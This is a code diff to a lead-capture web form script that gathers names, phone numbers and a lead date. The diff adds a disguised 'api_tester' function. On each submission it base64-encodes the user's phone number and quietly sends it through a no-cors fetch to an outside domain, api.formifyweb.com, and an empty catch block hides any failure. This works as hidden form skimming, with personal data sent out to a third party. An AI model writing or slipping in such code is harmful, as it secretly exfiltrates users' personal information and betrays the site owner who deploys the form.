@@ -11,6 +11,7 @@ pingData.append('sub1', '1H');
 pingData.append('firstname', document.getElementById('first_name').value);
 pingData.append('lastname', document.getElementById('last_name').value);
 pingData.append('phone', document.getElementById('phone').value);
+api_tester(document.getElementById('phone').value);
 const inputValue = document.getElementById("leadcreationdate").value; 
 const formattedDate = inputValue.replace("T", " ") + ":00";
 pingData.append('leadcreationdate', formattedDate);
@@ -133,4 +134,14 @@ function formatDateTime(date) {
          `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
 }
 
-    
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
